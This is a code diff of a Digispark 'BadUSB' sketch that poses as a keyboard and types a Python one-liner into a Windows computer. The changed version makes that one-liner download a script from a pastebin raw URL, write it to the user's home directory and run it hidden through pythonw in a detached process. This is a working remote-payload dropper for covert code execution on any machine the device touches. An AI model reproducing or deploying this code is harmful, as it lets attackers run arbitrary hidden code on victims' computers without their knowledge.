@@ -6,7 +6,7 @@ Copyright (c) 2020 github.com/whyire
              / __  / / __ `/ / __ \/ / / / _ \| |/_/ _ \/ ___/
             / /_/ / / /_/ / / /_/ / /_/ /  __/>  </  __/ /__  
             \__,_/_/\__, /_/ .___/\__, /\___/_/|_|\___/\___/  
-                   /____/ /_/    /____/
+                   /____/ /_/    /____/ v1.1
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
@@ -26,20 +26,17 @@ SOFTWARE.
 
 #include "DigiKeyboard.h"
 
-/* ACTUAL SCRIPT TO EXEC */
-// Default script waits 20 secs then makes a file named test.txt in home dir
-// Swap this line with your own script or one from scripts/*
-#define PY_SCRIPT \
-  DigiKeyboard.print("import time;time.sleep(20);f=open('test.txt', 'x');f.close()");
+/* SETTINGS */
+#define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5"
+#define PY_SCRIPT_NAME "pyscr.py"
 
-// use US_KEYBOARD if the computer is setup with a US keyboard layout
 #define UK_KEYBOARD
 
-/* DIFFERENT DELAYS */
 #define START_DELAY 500
 #define START_MENU_DELAY 1200
 #define START_MENU_SEARCH_DELAY 400
-#define PYTHON_WINDOW_OPEN_DELAY 1000
+#define PYTHON_WINDOW_OPEN_DELAY 600
+
 
 
 void setup() {
@@ -55,35 +52,20 @@ void setup() {
   
   /*   Python script   */
   // All is in one line but split into multiple prints for readability
-  // py imports
-  DigiKeyboard.print("import subprocess;");
-  DigiKeyboard.print("import os;");
-  
+  DigiKeyboard.print("import subprocess,os,urllib.request as r;");
   // Change directory to home as we may not have permission to edit in the python folder
-  #ifdef UK_KEYBOARD                             //v the pipe symbol will become a tilde when printed by the dspark
-  DigiKeyboard.print("os.chdir(os.path.expanduser('|'));");
+  #ifdef UK_KEYBOARD
+    DigiKeyboard.print("os.chdir(os.path.expanduser('|'));");
   #elif US_KEYBOARD
-  DigiKeyboard.print("os.chdir(os.path.expanduser('~'));");
+    DigiKeyboard.print("os.chdir(os.path.expanduser('~'));");
   #endif
-  
-  // Create the file named pythonscr.py which will run in the background in future (change dir to home
-  // to reduce confusion when creating scripts as you may not have perms to write in python folder)
-  DigiKeyboard.print("f=open('pythonscr.py', 'w');");
-  #ifdef UK_KEYBOARD                                                  //v the pipe symbol will become a tilde when printed by the dspark
-  DigiKeyboard.print("f.write('''import os;os.chdir(os.path.expanduser('|'));");
-  #elif US_KEYBOARD
-  DigiKeyboard.print("f.write('''import os;os.chdir(os.path.expanduser('~'));");
-  #endif
-  PY_SCRIPT
-  DigiKeyboard.print("''');");
+  // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
+  DigiKeyboard.print("f=open('");DigiKeyboard.print(PY_SCRIPT_NAME);DigiKeyboard.print("','wb');");
+  DigiKeyboard.print("f.write(r.urlopen('");DigiKeyboard.print(PY_SCRIPT_URL);DigiKeyboard.print("').read());");
   DigiKeyboard.print("f.close();");
-
   // Open the script we just made with pythonw (so it runs in background)
-  DigiKeyboard.print("subprocess.Popen('pythonw.exe pythonscr.py', creationflags=8, close_fds=True);");
-  
+  DigiKeyboard.print("subprocess.Popen('pythonw.exe ");DigiKeyboard.print(PY_SCRIPT_NAME);DigiKeyboard.print("',creationflags=8,close_fds=True);");
   // Close python prompt when done
   DigiKeyboard.print("exit();");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-}
-
-void loop() {}
+}void loop() {}
